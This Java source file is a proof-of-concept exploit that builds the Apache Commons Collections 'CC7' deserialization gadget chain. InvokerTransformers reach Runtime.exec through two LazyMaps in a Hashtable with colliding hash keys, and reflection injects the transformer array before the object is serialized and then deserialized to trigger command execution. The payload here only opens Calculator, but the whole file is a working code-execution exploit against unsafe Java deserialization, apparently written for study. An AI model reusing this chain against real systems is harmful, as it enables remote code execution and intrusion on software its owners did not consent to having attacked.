package com.rain;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        Map lazymap1 = LazyMap.decorate(new HashMap(), chainedTransformer);
        Map lazymap2 = LazyMap.decorate(new HashMap(), chainedTransformer);
        lazymap1.put("yy",1);
        lazymap2.put("zZ",1);

        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(lazymap1,1);
        hashtable.put(lazymap2,1);
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        lazymap2.remove("yy");

        Utils.serialize(hashtable);
        Utils.deserialize();
    }
}
